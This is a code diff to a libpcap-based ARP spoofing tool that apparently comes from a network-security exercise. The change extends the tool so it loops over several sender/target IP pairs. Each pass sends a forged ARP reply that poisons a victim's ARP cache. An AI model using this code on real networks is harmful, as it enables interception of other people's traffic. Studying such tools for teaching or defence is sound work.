@@ -26,7 +26,7 @@ void getMAC(char *iface, unsigned char *mac) {
 }
 
 int main(int argc, char* argv[]) {
-	if (argc < 3) {
+	if (argc < 3 || argc%2==1) {
 		usage();
 		return -1;
 	}
@@ -58,14 +58,14 @@ int main(int argc, char* argv[]) {
     }
 
     close(fd);
-
+    int i =2;
+    while(true){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
 		return -1;
 	}
-
 	EthArpPacket arp_packet;
 
 	arp_packet.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
@@ -79,7 +79,7 @@ int main(int argc, char* argv[]) {
 	arp_packet.arp_.sip_ = htonl(Ip(my_ip));
 	arp_packet.arp_.smac_ = Mac(mac);
 	arp_packet.arp_.tmac_ = Mac("00-00-00-00-00-00");
-	arp_packet.arp_.tip_ = htonl(Ip(argv[2]));
+	arp_packet.arp_.tip_ = htonl(Ip(argv[i]));
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
 	if (res != 0) {
@@ -91,7 +91,6 @@ int main(int argc, char* argv[]) {
 		const u_char* packet;
 		int res = pcap_next_ex(handle, &header, &packet);
 		EthArpPacket* reply = (EthArpPacket*)packet;
-		printf("Found target MAC address: %s\n", std::string(reply->arp_.smac_).c_str());
 		strcpy(victim_mac, std::string(reply->arp_.smac_).c_str());
                 break;
 		}
@@ -104,14 +103,20 @@ int main(int argc, char* argv[]) {
         arp_packet.arp_.hln_ = Mac::SIZE;
         arp_packet.arp_.pln_ = Ip::SIZE;
         arp_packet.arp_.op_ = htons(ArpHdr::Reply);
-        arp_packet.arp_.sip_ = htonl(Ip(argv[3]));
+        arp_packet.arp_.sip_ = htonl(Ip(argv[i+1]));
         arp_packet.arp_.smac_ = Mac(mac);
         arp_packet.arp_.tmac_ = Mac(victim_mac);
-        arp_packet.arp_.tip_ = htonl(Ip(argv[2]));
+        arp_packet.arp_.tip_ = htonl(Ip(argv[i]));
 
         int atk = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
         if (atk != 0) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(handle));
         }	
+	i+=2;
+	if (i>=argc){
+		break;
+	}
+	
 	pcap_close(handle);
+}
 }
